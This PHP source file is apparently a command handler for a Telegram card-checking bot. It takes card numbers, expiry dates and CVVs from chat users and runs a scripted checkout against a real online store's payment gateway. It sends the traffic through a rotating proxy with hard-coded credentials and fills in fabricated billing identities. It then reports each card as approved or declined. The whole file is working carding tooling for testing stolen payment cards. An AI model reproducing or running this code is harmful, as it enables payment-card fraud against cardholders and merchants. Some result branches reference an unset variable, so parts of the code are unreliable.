<?php

$gatewayname="ps";
if (preg_match('/^[\/\.,\$](?:'.$gatewayname.')(?:\s+(.+))?$/i', $message, $matches)) {
//==================[Inicializacion de variables]======================//
$messages = $bot->loadPlantillas();
$gateway = "#Payeezy + Chase (".'$3'.")";
$lang = $db->getUserLanguage($userId);
//==================[Manejo de los Usuarios]======================//
 $accessMessage = $db->verifyUserAccess($userId, $chat_id,'$'.$gatewayname);
if ($accessMessage !== null) {
$bot->callApi('sendMessage', [
    'chat_id' => $chat_id,
    'text' => $bot->translateTemplate($accessMessage, 'en', $lang),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
    ]);
    return; 
    }
    
//==================[Mensaje configuracion y time]======================//
$lista = $bot->getCleanList($message, $replyMessageText);
$starttim = microtime(true);
//==================[REGEX]======================//
$validationResult = $bot->validateCreditCard($lista);
if (is_string($validationResult)) {
    $editmessage = $bot->callApi('SendMessage', [
        'chat_id' => $chat_id,
        'text' => $bot->translateTemplate($validationResult, 'en', $lang),
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true

    ])
    ]);
    sleep(3);
    $bot->callApi('deleteMessage', [
        'chat_id' => $chat_id,
        'message_id' => $editmessage 
    ]);
    return;
}

$cc = $validationResult['cc'];
$mes = $bot->formatearMes($validationResult['mes']);
$ano = $validationResult['ano'];
$ano1 = (strlen($ano) == 2) ? $ano : substr($ano, 2);
$cvv = $validationResult['cvv'];
$creditcard = $validationResult['creditcard'];
    //==================[Antispam]======================//
    $antispam = $db->antispamCheck($userId,$username?:$firstname);

    if($antispam != False){
        $editmessage = $bot->callApi('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>$antispam,
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    
        ])
      ]);
      sleep(3);
      $bot->callApi('deleteMessage', [
          'chat_id' => $chat_id,
          'message_id' => $editmessage 
      ]);
      return;
    }
$editmessage = $bot->callApi('SendMessage', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['vSiesta_gateway'], 'en', $lang),
$gateway,
    $creditcard),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
]);
    

 //==================[Random Direcciones]======================//
    $userData = Fake::GetUser('US');

    $firstName = $userData['first_name'];
    $lastName = $userData['last_name'];
    $username1 = $userData['username'];
    $email = $userData['email'];
    $password = $userData['password'];
    $phone = $userData['phone']['format2'];
    $userAgent = $userData['userAgent'];

    $street = $userData['street'];
    $country = $userData['country'];
    $iso2 = $userData['iso2'];
    $state = $userData['state'];
    $state_id = $userData['state_id'];
    $city = $userData['city'];
    $zip = $userData['zip'];
    $lastFourDigits = substr($cc, -4);
 //==================[Bin Verificador]======================//
    $bin = substr($cc, 0, 6);
    $resultado = $bot->verificarBin($bin);

    if (!is_string($resultado)) { // Verificamos que no sea un mensaje de error
        $brand = $resultado['brand'];
        $country = $resultado['country'];
        $country_name = $resultado['country_name'];
        $country_flag = $resultado['country_flag'];
        $country_currencies = $resultado['country_currencies'];
        $bank = $resultado['bank'];
        $level = $resultado['level'];
        $type = $resultado['type'];
    } else {
        $bot->callApi('EditMessageText', [
            'chat_id' => $chat_id,
            'text' => $resultado,
            'parse_mode' => 'html',
            'message_id' => $editmessage,
         
        ]);
        exit();
    }
    
 //==================[Proxys y Cookies]======================//
 $socks5 = "gw.dataimpulse.com:823";
 $rotate = "b097452cc0d2c2bcc268:7580f00952ea0161";
 
 $cookie = uniqid();

 switch (substr($cc, 0, 1)) {
    case '3':
        $type = "Amex";
        break;
    case '5':
        $type = "Mastercard";
        break;
    case '6':
        $type = "Discover";
        break;
    default:
        $type = "Visa";
        break;
}
 
 $proxies = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];

 //==================[Curl Request]======================//
 


 $response = CurlX::Post(
    "https://www.lifelineint.com/index.php?l=addtocart",
    'product%5Bid%5D=509&product%5Bquantity%5D=1',
    [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://www.lifelineint.com',
        'Referer: https://www.lifelineint.com/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);
$response = CurlX::Get(
    "https://www.lifelineint.com/index.php?l=quick_checkout",
    [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
        'Referer: https://www.lifelineint.com/index.php?l=cart_view',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);
$response = CurlX::Post(
    "https://www.lifelineint.com/index.php?l=loading&mess=Attempting%20to%20calculate%20shipping%20costs...&nofocus=1",
    'userinfo[bill_first_name]=&userinfo[bill_last_name]=&userinfo[bill_company_name]=&userinfo[bill_address1]=&userinfo[bill_address2]=&userinfo[bill_city]=&userinfo[bill_state]=NV&userinfo[bill_other]=&userinfo[bill_zip]=&userinfo[bill_country]=US&userinfo[phone]=&userinfo[email]=&userinfo[username]=&userinfo[password1]=&userinfo[password2]=&userinfo[bill_oset]=0&userinfo[ship_first_name]=&userinfo[ship_last_name]=&userinfo[ship_company_name]=&userinfo[ship_address1]=&userinfo[ship_address2]=&userinfo[ship_city]=&userinfo[ship_state]=NV&userinfo[ship_other]=&userinfo[ship_zip]=&userinfo[ship_country]=US&userinfo[ship_oset]=0&=Show%20Shipping%20Rates&order[giftcert]=&order[payment_method]=credit_card&order[cc_name_on_card]=&order[cc_card_no]=&order[cc_card_type]='.$type.'&order[cc_cvv2]=&order[cc_expir_month]=1&order[cc_expir_year]=2024&order[cc_start_month]=1&order[cc_start_year]=2024&order[cc_issue]=&order[payment_method]=cod&order[payment_method]=check&=Continue',
    [
        'Accept: */*',
        'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://www.lifelineint.com',
        'Referer: https://www.lifelineint.com/quick_checkout.php?',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);
$response = CurlX::Post(
    "https://www.lifelineint.com/index.php?l=qcshipping&silent=1",
    'userinfo[bill_first_name]=&userinfo[bill_last_name]=&userinfo[bill_company_name]=&userinfo[bill_address1]=&userinfo[bill_address2]=&userinfo[bill_city]=&userinfo[bill_state]=NV&userinfo[bill_other]=&userinfo[bill_zip]=&userinfo[bill_country]=US&userinfo[phone]=&userinfo[email]=&userinfo[username]=&userinfo[password1]=&userinfo[password2]=&userinfo[bill_oset]=0&userinfo[ship_first_name]=&userinfo[ship_last_name]=&userinfo[ship_company_name]=&userinfo[ship_address1]=&userinfo[ship_address2]=&userinfo[ship_city]=&userinfo[ship_state]=NV&userinfo[ship_other]=&userinfo[ship_zip]=&userinfo[ship_country]=US&userinfo[ship_oset]=0&=Show%20Shipping%20Rates&order[giftcert]=&order[payment_method]=credit_card&order[cc_name_on_card]=&order[cc_card_no]=&order[cc_card_type]='.$type.'&order[cc_cvv2]=&order[cc_expir_month]=1&order[cc_expir_year]=2024&order[cc_start_month]=1&order[cc_start_year]=2024&order[cc_issue]=&order[payment_method]=cod&order[payment_method]=check&=Continue',
    [
        'Accept: */*',
        'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://www.lifelineint.com',
        'Referer: https://www.lifelineint.com/quick_checkout.php?',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);


$response = CurlX::Post(
    "https://www.lifelineint.com/index.php?l=loading&mess=Attempting%20to%20calculate%20shipping%20costs...&nofocus=1",
    'userinfo[bill_first_name]=alex&userinfo[bill_last_name]=frick&userinfo[bill_company_name]=revenge&userinfo[bill_address1]=2557%20Moore%20Avenue&userinfo[bill_address2]=&userinfo[bill_city]=Dallas&userinfo[bill_state]=TX&userinfo[bill_other]=&userinfo[bill_zip]=75201&userinfo[bill_country]=US&userinfo[phone]=2144029602&userinfo[email]='.$email.'&userinfo[username]='.$email.'&userinfo[password1]=03032008&userinfo[password2]=03032008&userinfo[bill_oset]=0&userinfo[ship_first_name]=alex&userinfo[ship_last_name]=frick&userinfo[ship_company_name]=revenge&userinfo[ship_address1]=2557%20Moore%20Avenue&userinfo[ship_address2]=&userinfo[ship_city]=Dallas&userinfo[ship_state]=NV&userinfo[ship_other]=&userinfo[ship_zip]=&userinfo[ship_country]=US&userinfo[ship_oset]=0&=Show%20Shipping%20Rates&order[giftcert]=&order[payment_method]=credit_card&order[cc_name_on_card]=&order[cc_card_no]=&order[cc_card_type]='.$type.'&order[cc_cvv2]=&order[cc_expir_month]=1&order[cc_expir_year]=2024&order[cc_start_month]=1&order[cc_start_year]=2024&order[cc_issue]=&order[payment_method]=cod&order[payment_method]=check&=Continue',
    [
        'Accept: */*',
        'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://www.lifelineint.com',
        'Referer: https://www.lifelineint.com/quick_checkout.php?',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);


$response = CurlX::Post(
    "https://www.lifelineint.com/index.php?l=loading&mess=Attempting%20to%20calculate%20shipping%20costs...&nofocus=1",
    'userinfo[bill_first_name]=alex&userinfo[bill_last_name]=frick&userinfo[bill_company_name]=revenge&userinfo[bill_address1]=2557%20Moore%20Avenue&userinfo[bill_address2]=&userinfo[bill_city]=Dallas&userinfo[bill_state]=TX&userinfo[bill_other]=&userinfo[bill_zip]=75201&userinfo[bill_country]=US&userinfo[phone]=2144029602&userinfo[email]='.$email.'&userinfo[username]='.$email.'&userinfo[password1]=03032008&userinfo[password2]=03032008&userinfo[bill_oset]=0&userinfo[ship_first_name]=alex&userinfo[ship_last_name]=frick&userinfo[ship_company_name]=revenge&userinfo[ship_address1]=2557%20Moore%20Avenue&userinfo[ship_address2]=&userinfo[ship_city]=Dallas&userinfo[ship_state]=TX&userinfo[ship_other]=&userinfo[ship_zip]=&userinfo[ship_country]=US&userinfo[ship_oset]=0&=Show%20Shipping%20Rates&order[giftcert]=&order[payment_method]=credit_card&order[cc_name_on_card]=&order[cc_card_no]=&order[cc_card_type]='.$type.'&order[cc_cvv2]=&order[cc_expir_month]=1&order[cc_expir_year]=2024&order[cc_start_month]=1&order[cc_start_year]=2024&order[cc_issue]=&order[payment_method]=cod&order[payment_method]=check&=Continue',
    [
        'Accept: */*',
        'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://www.lifelineint.com',
        'Referer: https://www.lifelineint.com/quick_checkout.php?',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);

$response = CurlX::Post(
    "https://www.lifelineint.com/index.php?l=loading&mess=Attempting%20to%20calculate%20shipping%20costs...&nofocus=1",
    'userinfo[bill_first_name]=alex&userinfo[bill_last_name]=frick&userinfo[bill_company_name]=revenge&userinfo[bill_address1]=2557%20Moore%20Avenue&userinfo[bill_address2]=&userinfo[bill_city]=Dallas&userinfo[bill_state]=TX&userinfo[bill_other]=&userinfo[bill_zip]=75201&userinfo[bill_country]=US&userinfo[phone]=2144029602&userinfo[email]='.$email.'&userinfo[username]='.$email.'&userinfo[password1]=03032008&userinfo[password2]=03032008&userinfo[bill_oset]=0&userinfo[ship_first_name]=alex&userinfo[ship_last_name]=frick&userinfo[ship_company_name]=revenge&userinfo[ship_address1]=2557%20Moore%20Avenue&userinfo[ship_address2]=&userinfo[ship_city]=Dallas&userinfo[ship_state]=TX&userinfo[ship_other]=&userinfo[ship_zip]=75201&userinfo[ship_country]=US&userinfo[ship_oset]=0&=Show%20Shipping%20Rates&order[giftcert]=&order[payment_method]=credit_card&order[cc_name_on_card]=&order[cc_card_no]=&order[cc_card_type]='.$type.'&order[cc_cvv2]=&order[cc_expir_month]=1&order[cc_expir_year]=2024&order[cc_start_month]=1&order[cc_start_year]=2024&order[cc_issue]=&order[payment_method]=cod&order[payment_method]=check&=Continue',
    [
        'Accept: */*',
        'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://www.lifelineint.com',
        'Referer: https://www.lifelineint.com/quick_checkout.php?',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);
$response = CurlX::Post(
    "https://www.lifelineint.com/index.php?l=qcshipping&silent=1",
    'userinfo[bill_first_name]=alex&userinfo[bill_last_name]=frick&userinfo[bill_company_name]=revenge&userinfo[bill_address1]=2557%20Moore%20Avenue&userinfo[bill_address2]=&userinfo[bill_city]=Dallas&userinfo[bill_state]=TX&userinfo[bill_other]=&userinfo[bill_zip]=75201&userinfo[bill_country]=US&userinfo[phone]=2144029602&userinfo[email]='.$email.'&userinfo[username]='.$email.'&userinfo[password1]=03032008&userinfo[password2]=03032008&userinfo[bill_oset]=0&userinfo[ship_first_name]=alex&userinfo[ship_last_name]=frick&userinfo[ship_company_name]=revenge&userinfo[ship_address1]=2557%20Moore%20Avenue&userinfo[ship_address2]=&userinfo[ship_city]=Dallas&userinfo[ship_state]=TX&userinfo[ship_other]=&userinfo[ship_zip]=75201&userinfo[ship_country]=US&userinfo[ship_oset]=0&=Show%20Shipping%20Rates&order[giftcert]=&order[payment_method]=credit_card&order[cc_name_on_card]=&order[cc_card_no]=&order[cc_card_type]='.$type.'&order[cc_cvv2]=&order[cc_expir_month]=1&order[cc_expir_year]=2024&order[cc_start_month]=1&order[cc_start_year]=2024&order[cc_issue]=&order[payment_method]=cod&order[payment_method]=check&=Continue',
    [
        'Accept: */*',
        'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://www.lifelineint.com',
        'Referer: https://www.lifelineint.com/quick_checkout.php?',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);
$response = CurlX::Post(
    "https://www.lifelineint.com/index.php?l=qcshipping&silent=1",
    'userinfo[bill_first_name]=alex&userinfo[bill_last_name]=frick&userinfo[bill_company_name]=revenge&userinfo[bill_address1]=2557%20Moore%20Avenue&userinfo[bill_address2]=&userinfo[bill_city]=Dallas&userinfo[bill_state]=TX&userinfo[bill_other]=&userinfo[bill_zip]=75201&userinfo[bill_country]=US&userinfo[phone]=2144029602&userinfo[email]='.$email.'&userinfo[username]='.$email.'&userinfo[password1]=03032008&userinfo[password2]=03032008&userinfo[bill_oset]=0&userinfo[ship_first_name]=alex&userinfo[ship_last_name]=frick&userinfo[ship_company_name]=revenge&userinfo[ship_address1]=2557%20Moore%20Avenue&userinfo[ship_address2]=&userinfo[ship_city]=Dallas&userinfo[ship_state]=TX&userinfo[ship_other]=&userinfo[ship_zip]=75201&userinfo[ship_country]=US&userinfo[ship_oset]=0&=Show%20Shipping%20Rates&order[giftcert]=&order[payment_method]=credit_card&order[cc_name_on_card]=&order[cc_card_no]=&order[cc_card_type]='.$type.'&order[cc_cvv2]=&order[cc_expir_month]=1&order[cc_expir_year]=2024&order[cc_start_month]=1&order[cc_start_year]=2024&order[cc_issue]=&order[payment_method]=cod&order[payment_method]=check&=Continue',
    [
        'Accept: */*',
        'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://www.lifelineint.com',
        'Referer: https://www.lifelineint.com/quick_checkout.php?',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);
$response = CurlX::Post(
    "https://www.lifelineint.com/index.php?l=qcshipping&silent=1",
    'userinfo[bill_first_name]=alex&userinfo[bill_last_name]=frick&userinfo[bill_company_name]=revenge&userinfo[bill_address1]=2557%20Moore%20Avenue&userinfo[bill_address2]=&userinfo[bill_city]=Dallas&userinfo[bill_state]=TX&userinfo[bill_other]=&userinfo[bill_zip]=75201&userinfo[bill_country]=US&userinfo[phone]=2144029602&userinfo[email]='.$email.'&userinfo[username]='.$email.'&userinfo[password1]=03032008&userinfo[password2]=03032008&userinfo[bill_oset]=0&userinfo[ship_first_name]=alex&userinfo[ship_last_name]=frick&userinfo[ship_company_name]=revenge&userinfo[ship_address1]=2557%20Moore%20Avenue&userinfo[ship_address2]=&userinfo[ship_city]=Dallas&userinfo[ship_state]=TX&userinfo[ship_other]=&userinfo[ship_zip]=75201&userinfo[ship_country]=US&userinfo[ship_oset]=0&=Show%20Shipping%20Rates&order[giftcert]=&order[payment_method]=credit_card&order[cc_name_on_card]=&order[cc_card_no]=&order[cc_card_type]='.$type.'&order[cc_cvv2]=&order[cc_expir_month]=1&order[cc_expir_year]=2024&order[cc_start_month]=1&order[cc_start_year]=2024&order[cc_issue]=&order[payment_method]=cod&order[payment_method]=check&=Continue',
    [
        'Accept: */*',
        'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://www.lifelineint.com',
        'Referer: https://www.lifelineint.com/quick_checkout.php?',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);
$response = CurlX::Post(
    "https://www.lifelineint.com/index.php?l=qcshipping&silent=1",
    'userinfo[bill_first_name]=alex&userinfo[bill_last_name]=frick&userinfo[bill_company_name]=revenge&userinfo[bill_address1]=2557%20Moore%20Avenue&userinfo[bill_address2]=&userinfo[bill_city]=Dallas&userinfo[bill_state]=TX&userinfo[bill_other]=&userinfo[bill_zip]=75201&userinfo[bill_country]=US&userinfo[phone]=2144029602&userinfo[email]='.$email.'&userinfo[username]='.$email.'&userinfo[password1]=03032008&userinfo[password2]=03032008&userinfo[bill_oset]=0&userinfo[same]=copy&userinfo[ship_first_name]=alex&userinfo[ship_last_name]=frick&userinfo[ship_company_name]=revenge&userinfo[ship_address1]=2557%20Moore%20Avenue&userinfo[ship_address2]=&userinfo[ship_city]=Dallas&userinfo[ship_state]=TX&userinfo[ship_other]=&userinfo[ship_zip]=75201&userinfo[ship_country]=US&userinfo[ship_oset]=0&=Show%20Shipping%20Rates&order[giftcert]=&order[payment_method]=credit_card&order[cc_name_on_card]=&order[cc_card_no]=&order[cc_card_type]='.$type.'&order[cc_cvv2]=&order[cc_expir_month]=1&order[cc_expir_year]=2024&order[cc_start_month]=1&order[cc_start_year]=2024&order[cc_issue]=&order[payment_method]=cod&order[payment_method]=check&=Continue',
    [
        'Accept: */*',
        'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://www.lifelineint.com',
        'Referer: https://www.lifelineint.com/quick_checkout.php?',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);
$response = CurlX::Post(
    "https://www.lifelineint.com/index.php?l=check_quickcheckout",
    'userinfo[bill_first_name]=alex&userinfo[bill_last_name]=frick&userinfo[bill_company_name]=revenge&userinfo[bill_address1]=2557%20Moore%20Avenue&userinfo[bill_address2]=&userinfo[bill_city]=Dallas&userinfo[bill_state]=TX&userinfo[bill_other]=&userinfo[bill_zip]=75201&userinfo[bill_country]=US&userinfo[phone]=2144029602&userinfo[email]='.$email.'&userinfo[username]='.$email.'&userinfo[password1]=03032008&userinfo[password2]=03032008&userinfo[bill_oset]=0&userinfo[same]=copy&userinfo[ship_first_name]=alex&userinfo[ship_last_name]=frick&userinfo[ship_company_name]=revenge&userinfo[ship_address1]=2557%20Moore%20Avenue&userinfo[ship_address2]=&userinfo[ship_city]=Dallas&userinfo[ship_state]=TX&userinfo[ship_other]=&userinfo[ship_zip]=75201&userinfo[ship_country]=US&userinfo[ship_oset]=0&order[shipping]=%5BFedex%5D%20FedEx%20Ground%AE-%3E%2014.62&=Show%20Shipping%20Rates&order[giftcert]=&order[payment_method]=credit_card&order[cc_name_on_card]=alec%20torres&order[cc_card_no]='.$cc.'&order[cc_card_type]='.$type.'&order[cc_cvv2]='.$cvv.'&order[cc_expir_month]='.$mes.'&order[cc_expir_year]='.$ano.'&order[cc_start_month]=1&order[cc_start_year]=2024&order[cc_issue]=&=Continue',
    [
        'Accept: */*',
        'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://www.lifelineint.com',
        'Referer: https://www.lifelineint.com/quick_checkout.php?',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);


$response = CurlX::Post(
    "https://www.lifelineint.com/quick_checkout.php?l=review",
    'userinfo%5Bbill_first_name%5D=alex&userinfo%5Bbill_last_name%5D=frick&userinfo%5Bbill_company_name%5D=revenge&userinfo%5Bbill_address1%5D='.urlencode($street).'&userinfo%5Bbill_address2%5D=&userinfo%5Bbill_city%5D='.$city.'&userinfo%5Bbill_state%5D='.$state.'&userinfo%5Bbill_other%5D=&userinfo%5Bbill_zip%5D='.$zip.'&userinfo%5Bbill_country%5D=US&userinfo%5Bphone%5D='.$phone.'&userinfo%5Bemail%5D='.urlencode($email).'&userinfo%5Busername%5D='.urlencode($email).'&userinfo%5Bpassword1%5D=03032008&userinfo%5Bpassword2%5D=03032008&userinfo%5Bbill_oset%5D=0&userinfo%5Bsame%5D=copy&userinfo%5Bship_first_name%5D=alex&userinfo%5Bship_last_name%5D=frick&userinfo%5Bship_company_name%5D=revenge&userinfo%5Bship_address1%5D=2557+Moore+Avenue&userinfo%5Bship_address2%5D=&userinfo%5Bship_city%5D=Dallas&userinfo%5Bship_state%5D=TX&userinfo%5Bship_other%5D=&userinfo%5Bship_zip%5D=75201&userinfo%5Bship_country%5D=US&userinfo%5Bship_oset%5D=0&order%5Bshipping%5D=%5BFedex%5D+FedEx+Ground%C2%AE-%3E+14.62&order%5Bgiftcert%5D=&order%5Bpayment_method%5D=credit_card&order%5Bcc_name_on_card%5D=alec+torres&order%5Bcc_card_no%5D='.$cc.'&order%5Bcc_card_type%5D='.$type.'&order%5Bcc_cvv2%5D='.$cvv.'&order%5Bcc_expir_month%5D='.$mes.'&order%5Bcc_expir_year%5D='.$ano.'&order%5Bcc_start_month%5D=1&order%5Bcc_start_year%5D=2024&order%5Bcc_issue%5D=',
    [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://www.lifelineint.com',
        'Referer: https://www.lifelineint.com/quick_checkout.php?',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);


$response = CurlX::Post(
    "https://www.lifelineint.com/quick_checkout.php?l=process",
    'prev=quick_checkout&order%5Bcomments%5D=',
    [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://www.lifelineint.com',
        'Referer: https://www.lifelineint.com/quick_checkout.php?l=review',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);

 //==================[Manejo de los mensajes]======================//
// Crear una nueva instancia de DOMDocument.
$dom = new DOMDocument();

// Cargar el HTML (suprime errores por etiquetas mal cerradas).
libxml_use_internal_errors(true);
$dom->loadHTML($response->body);
libxml_clear_errors();

// Buscar el contenedor principal del mensaje de error.
$messageDiv = $dom->getElementById('divError');

if ($messageDiv) {
    // Buscar el elemento <strong> dentro del contenedor.
    $strongElements = $messageDiv->getElementsByTagName('strong');

    foreach ($strongElements as $element) {
        // Verificar si el contenido contiene el prefijo del error.
        if (strpos($element->nodeValue, 'An error occurred') !== false) {
            // Capturar el texto del nodo siguiente, que contiene el código de error.
            $nextSibling = $element->nextSibling;
            $errormessage = trim($nextSibling->nodeValue);

           
            break;
        }
    }
} else {
    $errormessage="Declined";
    file_put_contents(__DIR__ . "/../Responses/".str_replace(' ', '', trim($gateway)).".txt",$response->body);
}
 //==================[Fin time]======================//
$starttime = intval(microtime(true) - $starttim);
 //==================[Manejo del bot]======================//
 if($errormessage1 == "There was an error saving your payment method. Reason: Card Issuer Declined CVV"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
            " $errormessage",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "42 Credit Floor"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
          " $errormessage",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage1 == "Your account was created successfully"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText(  "Approved Auth!✅", "en", $lang),
            " $errormessage",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage1 == "Gateway Rejected: avs"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText(  "Approved!✅", "en", $lang),
           " $errormessage",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 else{
$bot->callApi('EditMessageText', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['gateway'], 'en', $lang),
        $gateway,
        $creditcard,
        $bot->translateText("Declined!❌", "en", $lang),
       " $errormessage",
        "$type - $level",
        $bank,
        "$country_name$country_flag",
        $starttime,
        $username ?: $firstname
    ),
    'parse_mode' => 'html',
    'message_id' => $editmessage,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
 
        ])
    ]);
}}
